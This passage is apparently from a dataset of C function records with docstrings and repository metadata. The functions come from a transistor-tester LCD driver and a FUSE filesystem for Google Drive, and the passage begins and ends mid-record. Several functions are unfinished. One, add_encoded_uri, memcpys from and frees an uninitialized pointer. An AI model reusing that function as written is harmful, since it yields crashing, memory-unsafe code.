    lcd_write_data(0);\n   }\n#elif (LCD_ST_TYPE == 7108)\n   // clear both controllers at the same time\n   unsigned char p;\n   unsigned char count;\n\n   _lcd_hw_select(3);\t\t\t\t// select both controllers\n   for (p = 0; p < (SCREEN_HEIGHT / 8); p++) {\n     lcd_command(CMD_SET_COLUMN_ADDR);\t\t// set horizontal position to 0\n     lcd_command(CMD_SET_PAGE | (0x07 & p));\t// set page 0 to 7, vertical position = p*8\n     for (count = 0; count < (SCREEN_WIDTH/2); count++)\n       lcd_write_data(0);\t\t\t// clear 64 row in each controller (128 row total)\n   }\n\n#elif (LCD_ST_TYPE == 7920)\n   unsigned char p;\n   unsigned char count;\n\n   for (count = 0; count < SCREEN_HEIGHT; count++) {\n     for (p = 0; p < (SCREEN_WIDTH / 8); p++) {\n       lcd_bit_mem[count][p] = 0;\t\t// clear bits in image data\n     }\n   }\n#elif ((LCD_ST_TYPE == 7735) || (LCD_ST_TYPE == 9163) || (LCD_ST_TYPE == 9341))\n   // clear display for the ST7735 color LCD controller\n #if (SCREEN_WIDTH < 256)\n   unsigned char p;\n #else\n   unsigned int p;\n #endif\n #if ((SCREEN_HEIGHT + LCD_ST7565_V_OFFSET) < 256)\n   unsigned char count;\n #else\n   unsigned int count;\n #endif\n\n   lcd_command(CMD_CASET);\n    lcd_write_word(0);\t// set start column\n    lcd_write_word(SCREEN_WIDTH);\t// set end column\n   lcd_command(CMD_RASET);\n    lcd_write_word(0);\t// set start row\n    lcd_write_word(SCREEN_HEIGHT + LCD_ST7565_V_OFFSET);\t// set end row\n   lcd_command(CMD_RAMWR);\t// write data to RAM\n   \n   for (count = 0; count < (SCREEN_HEIGHT + LCD_ST7565_V_OFFSET); count++) {\n     wdt_reset();\n     for (p = 0; p < SCREEN_WIDTH; p++) {\n #ifdef LCD_CHANGE_COLOR\n       lcd_write_word(lcd_bg_color.w);\t\t// clear 5 red / 6 green  / 5 blue pixels\n #else\n       lcd_write_word(LCD_BG_COLOR);\t\t// clear 5 red / 6 green / 5 blue pixels\n #endif\n     }\n   }\n#elif (LCD_ST_TYPE == 1327)\n   // clear display for the ST1327 color LCD controller\n   unsigned int p;\n   lcd_command(CMD_CASET);\n    lcd_command(0);\t// set start column\n    lcd_command((SCREEN_WIDTH/2)-1);\t// set end column\n    lcd_command(0);\t// set start column\n   lcd_command(CMD_RASET);\n    lcd_command(0);\t// set start row\n    lcd_command(SCREEN_HEIGHT-1);\t// set end row\n   for (p = 0; p < ((SCREEN_WIDTH/4)*SCREEN_HEIGHT); p++) {\n #ifdef LCD_CHANGE_COLOR\n       lcd_write_word(0xffff);\t\t// 4 white pixels\n #else\n       lcd_write_word(0);\t\t// 4 black pixels\n #endif\n     }\n#else\n   lcd_command(CMD_CLEAR_DISPLAY);\n   wait_about10ms();\n#endif\n   lcd_line1();\t\t\t// set cursor to Line1 Column 1, (only for OLED-Display)\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "//=================================================================\n", "func_signal": "void GetIr(uint8_t hipin, uint8_t lopin)", "code": "{\n  unsigned int u_res;\t// reverse voltage at 470k\n  unsigned int u_res_old;\n  unsigned int ir_nano;\n  uint8_t HiADC;\n\n  uint8_t LoPinR_L;\n#if (((PIN_RL1 + 1) != PIN_RH1) || ((PIN_RL2 + 1) != PIN_RH2) || ((PIN_RL3 + 1) != PIN_RH3))\n  HiADC = pgm_read_byte(&PinRLRHADCtab[hipin-TP_MIN]+6);\t// Table of ADC pins including | TXD_VAL\n  ADC_PORT = HiADC;\t\t \t// switch ADC port to high level\n  ADC_DDR = HiADC | TXD_MSK;\t\t// switch High Pin direct to VCC\n  R_PORT = 0;\t\t\t\t// switch R-Port to GND\n  LoPinR_L = pgm_read_byte(&PinRHRLADCtab[lopin-TP_MIN]);  //R_L mask for LowPin R_L load\n#else\n  HiADC = pgm_read_byte(&PinRLRHADCtab[hipin-TP_MIN]+3);\t// Table of ADC pins including | TXD_VAL\n  ADC_PORT = HiADC;\t\t \t// switch ADC port to high level\n  ADC_DDR = HiADC | TXD_MSK;\t\t// switch High Pin direct to VCC\n  R_PORT = 0;\t\t\t\t// switch R-Port to GND\n  LoPinR_L = pgm_read_byte(&PinRLRHADCtab[lopin-TP_MIN]);  //R_L mask for LowPin R_L load\n  // R_H Pin must always be one pin number higher\n#endif\n  R_DDR = LoPinR_L;\t\t// switch R_L port for LowPin to output (GND)\n  u_res = U_VCC;\n  // first load the parallel capacity with 680 Ohm resistor, then measure current with 470k\n  do {\n     u_res_old = u_res;\n     u_res = W20msReadADC(lopin);\t\t// read voltage\n#if (((PIN_RL1 + 1) != PIN_RH1) || ((PIN_RL2 + 1) != PIN_RH2) || ((PIN_RL3 + 1) != PIN_RH3))\n     R_DDR = pgm_read_byte(&PinRHRLADCtab[lopin-TP_MIN+3]);  //R_H mask for LowPin R_H load\n#else\n     R_DDR = LoPinR_L + LoPinR_L;\t\t// switch R_H port for LowPin to output (GND)\n#endif\n  } while (u_res < u_res_old);\n  if (u_res == 0) return;\t\t// no Output, if no current in reverse direction\n#if (LCD_LINES > 3)\n #define IR_DIGITS 3\n  lcd_line4();\t\t\t\t// use Line 4 for Ir output\n  lcd_MEM_string(Ir_str);\t\t// output text \"Ir=\"\n#else\n #define IR_DIGITS 2\n  lcd_MEM_string(Ir_str);\t\t// output text \"  Ir=\"\n#endif\n#ifdef WITH_IRMICRO\n  unsigned int ir_micro;\n  if (u_res < 2500) {\n#endif\n     /* R_H_VAL has units of 10 Ohm, u_res has units of mV, ir_nano has units of nA */\n     ir_nano = (unsigned long)(u_res * 100000UL) / R_H_VAL;\n     DisplayValue16(ir_nano,-9,'A',2);\t// output two digits of current with nA units\n#ifdef WITH_IRMICRO\n  } else {\n     R_DDR = LoPinR_L;\t\t\t// switch R_L port for LowPin to output (GND)\n     u_res = W5msReadADC(lopin);\t// read voltage\n     ir_nano = 0xffff;\t\t\t// set to max\n     /* RR680MI has units of 0.1 Ohm, u_res has units of mV, ir_micro has units of uA */\n     ir_micro = (unsigned long)(u_res * 10000UL) / RR680MI;\n     DisplayValue16(ir_micro,-6,'A',IR_DIGITS);\t// output 2 or 3 digits of current in uA units\n  }\n#endif\n  ADC_DDR = TXD_MSK;\t\t\t// switch off\n  ADC_PORT = TXD_VAL;\t\t\t// switch off\n  R_DDR = 0;\t\t\t\t// switch off current\n\n  return ;\n}", "path": "Software\\trunk\\GetIr.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n// load custom character from PGM or EEprom and send to LCD\n", "func_signal": "void lcd_fix_customchar(const unsigned char *chardata)", "code": "{\t\n#if (LCD_ST_TYPE == 0)\n    uint8_t ii;\n    for (ii=0;ii<8;ii++) {\n        lcd_data(MEM_read_byte(chardata++));\n    }\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n// writes a string to the LCD \n", "func_signal": "void lcd_string(char *data)", "code": "{\n    while(*data) {\n        lcd_data(*data);\n        data++;\n    }\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/** Reset the request.response data.\n *\n *  We want to do this in order to safely reuse a request_t.\n *\n *  @request struct request_t* the request containing the response to reset.\n */\n", "func_signal": "void ci_clear_response(struct request_t* request)", "code": "{\n\t// First, clear the data\n\tstr_destroy(&request->response.body);\n\tstr_destroy(&request->response.headers);\n\t// Then reinitialize the variables for further use\n\tstr_init(&request->response.body);\n\tstr_init(&request->response.headers);\n\t// Reset the flags\n\tmemset(&request->flags, 0, sizeof(struct request_flags_t));\n}", "path": "curl_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Escapes unsafe characters for adding to a URI.\n *\n *  This function simply wraps a char* in a str_t* and calls str_urlencode_str.\n *\n *  @url the string to escape\n *\n *  @returns url encoded str or NULL if error\n */\n", "func_signal": "struct str_t *str_urlencode_char (const char* url, size_t length)", "code": "{\n\tif(!length)\n\t\tlength = strlen(url);\n\tconst struct str_t tmp = { .str = url, .len = length, .reserved = length };\n\treturn str_urlencode_str(&tmp);\n}", "path": "str.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Read directory.\n *\n */\n", "func_signal": "int gd_readdir (const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fileinfo)", "code": "{\n\n\tfiller(buf, \".\", NULL, 0);\n\tfiller(buf, \"..\", NULL, 0);\n\tstruct gdi_state *state = &((struct gd_state*)fuse_get_context()->private_data)->gdi_data;\n\n\tstruct gd_fs_entry_t *iter = state->head;\n\twhile(iter != NULL)\n\t{\n\n\t\tif(filler(buf, iter->filename.str, NULL, 0))\n\t\t{\n\t\t\tfprintf(stderr, \"readdir() filler()\\n\");\n\t\t\treturn -ENOMEM;\n\t\t}\n\t\titer = iter->next;\n\t}\n\n\treturn 0;\n}", "path": "gd_fuse_operations.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Read data from an open file.\n *\n */\n", "func_signal": "int gd_read (const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fileinfo)", "code": "{\n\tstruct gdi_state *state = &((struct gd_state*)fuse_get_context()->private_data)->gdi_data;\n\tconst char* filename = gdi_strip_path(path);\n\tstruct gd_fs_entry_t *entry = gd_fs_entry_find(filename);\n\tif(!entry)\n\t\treturn 0;\n\tsize_t length = size;\n\tconst char const* chunk = gdi_read(&length, entry, offset);\n\tmemcpy(buf, chunk, length);\n\treturn length;\n}", "path": "gd_fuse_operations.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "//www.googleapis.com/auth/userinfo.profile\";\n", "func_signal": "int create_oauth_header(struct gdi_state* state)", "code": "{\n\tunion func_u func;\n\tint ret = 0;\n\tstruct str_t oauth;\n\tstruct str_t oauth_header;\n\n\tstr_init(&oauth_header);\n\tstr_init_create(&oauth, \"Authorization: OAuth \", 0);\n\n\tconst struct str_t const* concat[2] = {&oauth, &state->access_token};\n\n\tstr_init(&state->oauth_header);\n\tfunc.func3 = str_destroy;\n\tfstack_push(state->stack, &state->oauth_header, &func, 3);\n\n\tret = str_concat(&state->oauth_header, 2, concat);\n\tif(ret)\n\t\tfstack_pop(state->stack);\n\n\tstr_destroy(&oauth);\n\tstr_destroy(&oauth_header);\n\treturn ret;\n}", "path": "gd_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Extracts the md5sum from XML containing only an <entry>.\n *\n *  @xml struct str_t* the string containing the XML\n *\n *  @return a string containing the extracted md5sum.\n */\n", "func_signal": "struct str_t* xml_get_md5sum(const struct str_t* xml)", "code": "{\n\tsize_t length;\n\txmlNodePtr c1;\n\txmlChar *value = NULL;\n\tstruct str_t* ret = NULL;\n\n\tconst char* iter = strstr(xml->str, \"<entry\");\n\txmlDocPtr xmldoc = xmlParseMemory(iter, xml->len - (iter - xml->str));\n\n\txmlNodePtr node;\n\n\tif(xmldoc == NULL || xmldoc->children == NULL || xmldoc->children->children == NULL)\n\t\treturn NULL;\n\tfor(node = xmldoc->children->children; node != NULL; node = node->next)\n\t{\n\t\tchar const *name = node->name;\n\t\tswitch(*name)\n\t\t{\n\t\t\tcase 'm':\n\t\t\t\tif(strcmp(name, \"md5Checksum\") == 0)\n\t\t\t\t{\n\t\t\t\t\tret = (struct str_t*) malloc(sizeof(struct str_t));\n\t\t\t\t\tif(!ret)\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tvalue = xmlNodeListGetString(xmldoc, node->children, 1);\n\t\t\t\t\tstr_init_create(ret, value, 0);\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn ret;\n}", "path": "gd_cache.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** File open operation.\n *\n */\n", "func_signal": "int gd_open (const char *path, struct fuse_file_info * fileinfo)", "code": "{\n\tstruct gdi_state *state = &((struct gd_state*)fuse_get_context()->private_data)->gdi_data;\n\n\tint flags = fileinfo->flags;\n\t/*\n\t  Is it possible to have a file in drive or docs you cannot read?\n\t\tI suppose it may be the case that you lost read access since last checked,\n\t\tbut between open() and read() that can happen anyway, so why check here at\n\t\tall?\n\t\tMaybe something in the Access Control Lists allows this?\n\t*/\n\tif(flags & O_RDONLY)\n\t{\n\n\t}\n\n\t// TODO: everything below here\n\t// NOTE: O_RDWR won't work, just O_RDONLY\n\t// people can share read only files with you\n\tif(flags & O_WRONLY)\n\t{\n\n\t}\n\n\tif(flags & O_RDWR)\n\t{\n\n\t}\n\n\t// Don't need to check O_CREAT, O_EXCL, O_TRUNC\n\t// Do we need to check all these?\n\t/* Comment these out for now to reduce user headacke\n\tif(flags & O_APPEND);\n\tif(flags & O_ASYNC);\n\t//if(flags & O_DIRECT);\n\t// if(flags & O_DIRECTORY); // opendir() only?\n\t// if(flags & O_LARGEFILE);\n\t//if(flags & O_NOATIME); // does google drive do this anyway?\n\tif(flags & O_NOCTTY); // does this do anything/is it passed to us at all?\n\tif(flags & O_NOFOLLOW);\n\tif(flags & O_NONBLOCK || flags & O_NONBLOCK); // read man 2 fcntl and man 7 fifo\n\tif(flags & O_SYNC);\n\t*/\n\n\t// If we have access to this file, then load it. \n\t// TODO: Make gdi_load() nonblocking if appropriate\n\tconst char* filename = gdi_strip_path(path);\n\tstruct gd_fs_entry_t *entry = gd_fs_entry_find(filename);\n\tint load = gdi_load(state, entry);\n\tif(load)\n\t\treturn -1;\n\n\treturn 0;\n}", "path": "gd_fuse_operations.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Make a request.\n *\n *  @request struct request_t* the initialized request_t for making this request\n */\n", "func_signal": "int ci_request(struct request_t* request)", "code": "{\n\tci_reset_flags(request);\n\treturn curl_easy_perform(request->handle);\n}", "path": "curl_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Get file attributes.\n *\n */\n", "func_signal": "int gd_getattr (const char *path, struct stat *statbuf)", "code": "{\n\tstruct fuse_context *fc = fuse_get_context();\n\n\tif( strcmp(\"/\", path) == 0)\n\t{\n\t\tstatbuf->st_mode = S_IFDIR | 0700;\n\t\tstatbuf->st_nlink=2;\n\t}\n\telse\n\t{\n\t\tmemset(statbuf, 0, sizeof(struct stat));\n\t\tconst char *filename = gdi_strip_path(path);\n\t\tstruct gd_fs_entry_t * entry = gd_fs_entry_find(filename);\n\t\tif(!entry)\n\t\t\treturn -ENOENT;\n\n\t\tif(entry)\n\t\t\tstatbuf->st_size = entry->size;\n\n\t\tstatbuf->st_mode = S_IFREG | 0600;\n\t\tstatbuf->st_nlink=1;\n\t}\n\tstatbuf->st_uid = fc->uid;\n\tstatbuf->st_gid = fc->gid;\n\n\treturn 0;\n}", "path": "gd_fuse_operations.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Effectively strcat() that doesn't need to call strlen(buf).\n *\n */\n", "func_signal": "size_t add_unencoded_str(char *buf, const char *str, const size_t size)", "code": "{\n\tmemcpy(buf, str, size);\n\treturn size-1;\n}", "path": "gd_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Concatenate an urlencoded string with buf.\n *\n */\n", "func_signal": "size_t add_encoded_uri(char *buf, const char *uri, const size_t size)", "code": "{\n\tsize_t length = size;\n\tchar *encoded ;//= urlencode(uri, &length);\n\tmemcpy(buf, encoded, length);\n\tfree(encoded);\n\treturn length-1;\n}", "path": "gd_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Cleanup a request.\n *\n * @request struct request_t* the request to uninitialize\n */\n", "func_signal": "int ci_destroy(struct request_t* request)", "code": "{\n\twhile(request->cleanup.size)\n\t\tfstack_pop(&request->cleanup);\n\tfstack_destroy(&request->cleanup);\n\tmemset(request, 0, sizeof(struct request_t));\n\treturn 0;\n}", "path": "curl_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Initialize a request.\n *\n *  This handles setting up a request for curl. It is preferable to call this\n *  once for multiple requests to help curl reuse connections when possible.\n *  Use the other set and reset methods to change things for multiple requests.\n *\n *  @request      struct request_t* the request_t to initialize\n *  @uri          struct str_t*     the uri for the initial request\n *  @header_count size_t            the number of elements in headers[]\n *  @headers      struct str_t[]    the headers, if any, for this request\n *  @msg          const char*       a message for POST, NULL if not POST\n *  @type         enum request_type the type of the request, GET, POST, ...\n */\n", "func_signal": "int ci_init(struct request_t* request, struct str_t* uri,\n\t\tsize_t header_count, const struct str_t const headers[],\n\t\tconst char const* msg, enum request_type_e type)", "code": "{\n\t// TODO: Errors\n\tunion func_u func;\n\tint ret = 0;\n\n\tmemset(request, 0, sizeof(struct request_t));\n\n\tfstack_init(&request->cleanup, 10);\n\n\tCURL* handle = curl_easy_init();\n\tfunc.func1 = curl_easy_cleanup;\n\tfstack_push(&request->cleanup, handle, &func, 1);\n\n\tcurl_easy_setopt(handle, CURLOPT_VERBOSE, 1);\n\tcurl_easy_setopt(handle, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SSL\n\n\tcurl_easy_setopt(handle, CURLOPT_HEADER, 1); // Enable headers, necessary?\n\t// set curl_post_callback for parsing the server response\n\tcurl_easy_setopt(handle, CURLOPT_WRITEFUNCTION, ci_callback_controller);\n\t// set curl_post_callback's last parameter to state\n\tcurl_easy_setopt(handle, CURLOPT_WRITEDATA, &request->response);\n\n\tif(header_count)\n\t{\n\t\tret = ci_create_header(request, header_count, headers);\n\t\tcurl_easy_setopt(handle, CURLOPT_HTTPHEADER, request->headers); // Set headers\n\t}\n\n\tcurl_easy_setopt(handle, CURLOPT_USERAGENT, \"fuse-google-drive/0.1\");\n\n\tswitch(type)\n\t{\n\t\tcase GET:\n\t\t\tbreak;\n\t\tcase POST:\n\t\t\tcurl_easy_setopt(handle, CURLOPT_POSTFIELDS, msg);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t}\n\n\trequest->handle = handle;\n\n\tret = ci_set_uri(request, uri);\n\n\treturn ret;\n}", "path": "curl_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Curl callback to handle Google's response when listing files.\n *\n *  Because Google's server returns the file listing in chunks, this function\n *  puts all those chunks together into one contiguous string for each section,\n *  the header and the body.\n *\n *  It should be noted that this function is called for every line in the\n *  header of the response. This is why the CRLF scanning works the way it does.\n *\n *  @data  char*             the response from Google's server\n *  @size  size_t            size of one element in data\n *  @nmemb size_t            number of size chunks\n *  @store struct request_t* the request this callback is for\n *\n *  @returns the size of the data read, curl expects size*nmemb or it errors\n */\n", "func_signal": "size_t ci_callback_controller(void *data, size_t size, size_t nmemb, void *store)", "code": "{\n\tstruct request_t* req = (struct request_t*) store;\n\tstruct request_flags_t* flags = &req->flags;\n\n\t// Store the header portion of the reqponse\n\tif(!flags->header)\n\t{\n\t\t// Find the first occurrence of CRLF in this line of header\n\t\tchar* iter = strstr((char*) data, \"\\r\\n\");\n\t\t// If the header only contains CRLF, the header is over after this call\n\t\tif(iter == (char*)data)\n\t\t\tflags->header = 1;\n\t\tstruct str_t *header = &req->response.headers;\n\t\tstr_char_concat(header, (char*) data, size*nmemb);\n\t}\n\t// If we are not in the header section of the response, then\n\t// we need to store the body portion.\n\telse\n\t{\n\t\tstruct str_t *body = &req->response.body;\n\t\tstr_char_concat(body, (char*) data, size*nmemb);\n\t}\n\n\treturn size*nmemb;\n}", "path": "curl_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Creates and fills in a gd_fs_entry_t from an <entry>...</entry> in xml.\n *\n *  @xml  the xml containing the entry\n *  @node the node representing this <entry>...</entry> block\n *\n *  @returns pointer to gd_fs_entry_t with fields filled in as needed\n */\n", "func_signal": "struct gd_fs_entry_t* gd_fs_entry_from_xml(xmlDocPtr xml, xmlNodePtr node)", "code": "{\n\tstruct gd_fs_entry_t* entry;\n\n\tentry = (struct gd_fs_entry_t*) malloc(sizeof(struct gd_fs_entry_t));\n\tif(entry == NULL) {} // TODO: ERROR\n\tmemset(entry, 0, sizeof(struct gd_fs_entry_t));\n\n\tsize_t length;\n\txmlNodePtr c1, c2;\n\txmlChar *value = NULL;\n\n\tfor(c1 = node->children; c1 != NULL; c1 = c1->next)\n\t{\n\t\tchar const *name = c1->name;\n\t\tswitch(*name)\n\t\t{\n\t\t\tcase 'a': // 'author'\n\t\t\t\tfor(c2 = c1->children; c2 != NULL; c2 = c2->next)\n\t\t\t\t{\n\t\t\t\t\tname = c2->name;\n\t\t\t\t\tvalue = xmlNodeListGetString(xml, c2->children, 1);\n\t\t\t\t\tswitch(*name)\n\t\t\t\t\t{\n\t\t\t\t\t\tcase 'n':\n\t\t\t\t\t\t\tstr_init_create(&entry->author, value, 0);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'e':\n\t\t\t\t\t\t\tstr_init_create(&entry->author_email, value, 0);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 'c':\n\t\t\t\tif(strcmp(name, \"content\") == 0)\n\t\t\t\t{\n\t\t\t\t\tvalue = xmlGetProp(c1, \"src\");\n\t\t\t\t\tstr_init_create(&entry->src, value, 0);\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 'f':\n\t\t\t\tif(strcmp(name, \"feedlink\") == 0)\n\t\t\t\t{\n\t\t\t\t\tvalue = xmlGetProp(c1, \"rel\");\n\t\t\t\t\tif(strcmp(value, \"http://schemas.google.com/acl/2007#accessControlList\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Link for r/w access to ACLS for this entry\n\t\t\t\t\t\t// Do we care?\n\t\t\t\t\t\t// Can we expose this?\n\t\t\t\t\t}\n\t\t\t\t\telse if(strcmp(value, \"http://schemas.google.com/docs/2007/revisions\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Link for r/w access to revisions\n\t\t\t\t\t\t// It would be cool if we can expose these somehow\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 'l':\n\t\t\t\tif(strcmp(name, \"lastModifiedBy\") == 0)\n\t\t\t\t{\n\t\t\t\t\tfor(c2 = c1->children; c2 != NULL; c2 = c2->next)\n\t\t\t\t\t{\n\t\t\t\t\t\tname = c2->name;\n\t\t\t\t\t\tvalue = xmlNodeListGetString(xml, c2->children, 1);\n\t\t\t\t\t\tswitch(*name)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase 'n':\n\t\t\t\t\t\t\t\tstr_init_create(&entry->lastModifiedBy, value, 0);\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase 'e':\n\t\t\t\t\t\t\t\tstr_init_create(&entry->lastModifiedBy_email, value, 0);\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\txmlFree(value);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if(strcmp(name, \"link\") == 0)\n\t\t\t\t{\n\t\t\t\t\tvalue = xmlGetProp(c1, \"rel\");\n\t\t\t\t\tif(strcmp(value, \"http://schemas.google.com/docs/2007#parent\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// This entry is inside one (or more?) collections\n\t\t\t\t\t\t// These entries are the folders for this entry\n\t\t\t\t\t}\n\t\t\t\t\telse if(strcmp(value, \"alternate\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Link you can open this document in a web browser with\n\t\t\t\t\t\t// Do we care?\n\t\t\t\t\t}\n\t\t\t\t\telse if(strcmp(value, \"self\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Link to XML feed for just this entry\n\t\t\t\t\t\t// Might be useful for checking for updates instead of changesets\n\t\t\t\t\t\txmlChar *href = xmlGetProp(c1, \"href\");\n\t\t\t\t\t\tstr_init_create(&entry->feed, href, 0);\n\t\t\t\t\t\txmlFree(href);\n\t\t\t\t\t}\n\t\t\t\t\telse if(strcmp(value, \"edit\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// For writes?\n\t\t\t\t\t}\n\t\t\t\t\t/*\n\t\t\t\t\telse if(strcmp(value, \"edit-media\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// deprecated, use 'resumeable-edit-media'\n\t\t\t\t\t}\n\t\t\t\t\t*/\n\t\t\t\t\telse if(strcmp(value, \"http://schemas.google.com/g/2005#resumable-edit-media\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// For resumeable writes?\n\t\t\t\t\t\t// This may be the one we *really* want to use, rather than 'edit'\n\t\t\t\t\t}\n\t\t\t\t\telse if(strcmp(value, \"http://schemas.google.com/docs/2007/thumbnail\") == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Might be a useful way to expose this for GUI file managers?\n\t\t\t\t\t}\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 'm':\n\t\t\t\tif(strcmp(name, \"md5Checksum\") == 0)\n\t\t\t\t{\n\t\t\t\t\tvalue = xmlNodeListGetString(xml, c1->children, 1);\n\t\t\t\t\tentry->md5set = 1;\n\t\t\t\t\tstr_init_create(&entry->md5, value, 0);\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 't': // 'title'\n\t\t\t\tif(strcmp(name, \"title\") == 0)\n\t\t\t\t{\n\t\t\t\t\tvalue = xmlNodeListGetString(xml, c1->children, 1);\n\t\t\t\t\tstr_init_create(&entry->filename, value, 0);\n\t\t\t\t\tentry->filename.str = filenameencode(value, &entry->filename.len);\n\t\t\t\t\tentry->filename.reserved = entry->filename.len;\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 's':\n\t\t\t\tif(strcmp(name, \"size\") == 0)\n\t\t\t\t{\n\t\t\t\t\tvalue = xmlNodeListGetString(xml, c1->children, 1);\n\t\t\t\t\tlength = xmlStrlen(value);\n\t\t\t\t\t// TODO: errors?\n\t\t\t\t\tentry->size = strtol((char*)value, NULL, 10);\n\t\t\t\t\txmlFree(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn entry;\n}", "path": "gd_cache.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Searches hash table for a filename.\n *\n *  @key the name of the file to find\n *\n *  @returns the gd_fs_entry_t representing that file\n */\n", "func_signal": "struct gd_fs_entry_t* gd_fs_entry_find(const char* key)", "code": "{\n\tENTRY keyentry;\n\tkeyentry.key = key;\n\tkeyentry.data = NULL;\n\tENTRY* entry = hsearch(keyentry, FIND);\n\tif(entry == NULL)\n\t\treturn NULL;\n\treturn (struct gd_fs_entry_t*) entry->data;\n}", "path": "gd_cache.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Escapes unsafe characters for filenames.\n *\n *  @filename the string to escape\n *  @length length of filename\n *          precondition:  strlen(filename)\n *          postcondition: strlen(escaped filename)\n *\n *  @returns escaped, null terminated string\n */\n", "func_signal": "char* filenameencode (const char *filename, size_t *length)", "code": "{\n\tsize_t i;\n\tsize_t j;\n\tsize_t count = 0;\n\tsize_t size = *length;\n\t// Count the number of characters that need to be escaped\n\tfor(i = 0; i < size; ++i)\n\t{\n\t\tfor(j = 0; j < sizeof(filenameunsafe); ++j)\n\t\t{\n\t\t\tif(filename[i] == filenameunsafe[j])\n\t\t\t{\n\t\t\t\t++count;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\t// Allocate the correct amount of memory for the escaped string\n\tchar *result = (char *) malloc( sizeof(char) * (size + count*3 + 1));\n\tif(result == NULL)\n\t\treturn NULL;\n\n\t// Copy old string into escaped string, escaping where necessary\n\tchar *iter = result;\n\tfor(i = 0; i < size; ++i)\n\t{\n\t\tfor(j = 0; j < sizeof(filenameunsafe); ++j)\n\t\t{\n\t\t\t// We found a character that needs escaping\n\t\t\tif(filename[i] == filenameunsafe[j])\n\t\t\t{\n\t\t\t\t// Had a weird issue with sprintf(,\"\\%%02X,), so I do this instead\n\t\t\t\t*iter = 